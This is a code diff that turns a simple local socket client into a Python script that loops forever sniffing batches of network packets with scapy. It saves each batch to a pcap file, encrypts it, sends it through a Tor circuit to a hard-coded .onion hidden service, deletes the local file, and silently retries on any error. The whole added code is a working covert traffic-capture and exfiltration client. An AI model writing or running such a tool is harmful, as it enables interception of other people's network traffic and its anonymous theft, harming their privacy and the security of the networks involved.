@@ -1,36 +1,44 @@
-import socket
-import time
-import encryption
-import sniffing
+from torpy import TorClient
+from scapy.all import wrpcap
+from os import remove
+from time import sleep
 
-class Client:
-    def __init__(self,ip="127.0.0.1",port=8820):
-        self.client_socket=socket.socket()
-        self.ip = ip
-        self.port = port
+from encryption import encrypt
+from sniffing import packet_sniff
 
-    def connect(self):
-        return self.client_socket.connect_ex((self.ip,self.port))
+HOSTNAME = "524jkwd2v5gnigyq.onion"
+PORT = 8080
+NUMBER_OF_PACKETS_TO_SNIFF = 50
 
-    def talk(self):
-        packets = sniffing.timed_sniff(3, "1.1.1.1")
-        while True:
-            time.sleep(3)
-            
-            packets = sniffing.timed_sniff(1, "1.1.1.1")
-            p = packets[0]
-            p = sniffing.packet_to_bytes(p)
+while True:
+    try:
+        print("Establishing Connection Via Tor Circuits.")
+        with TorClient() as tor:
+            with tor.create_circuit(3) as circuit:
+                with circuit.create_stream((HOSTNAME,PORT)) as stream:
+                    counter = 1
+                    print("Client Connected!")
 
-            p = encryption.encrypt(p)
-            
-            self.client_socket.send(p)
-            
-def main():
-    client = Client()
-    while client.connect() != 0:
-        time.sleep(5)
-    client.connect()
-    client.talk()
+                    while True:
+                        sleep(2)
 
-if __name__ == "__main__":
-    main()
+                        print(str(counter) + " - sniffing")
+                        packets = packet_sniff(NUMBER_OF_PACKETS_TO_SNIFF)
+
+                        print(str(counter) + " - sniffed")
+                        wrpcap("file.pcap", packets)
+                        rfile = open("file.pcap", "rb")
+                        packets = rfile.read()
+                        
+                        print(str(counter) + " - sending")
+                        packets = encrypt(packets)
+                        stream.send(packets)
+                        stream.send(b"fin")
+                        print(str(counter) + " - sent")
+
+                        rfile.close()
+                        remove("file.pcap")
+                        #p = sniffing.packet_to_bytes(p)
+                        counter += 1
+    except:
+        continue
